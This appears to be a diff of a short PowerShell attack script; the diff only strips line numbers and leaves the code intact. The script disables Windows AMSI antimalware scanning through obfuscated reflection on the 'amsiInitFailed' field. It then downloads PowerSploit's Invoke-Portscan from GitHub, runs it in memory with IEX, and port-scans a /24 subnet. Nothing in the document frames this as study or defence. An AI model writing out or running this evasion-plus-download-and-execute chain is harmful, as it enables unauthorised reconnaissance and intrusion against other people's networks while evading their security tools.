@@ -1,12 +1,6 @@
-1
 $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';
-2
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));
-3
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');
-4
 $field.SetValue($null,$true);
-5
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');
-6
 invoke-portscan -hosts 20.0.113.0/24 -skipdiscovery -topports 50 -oA hello.txt
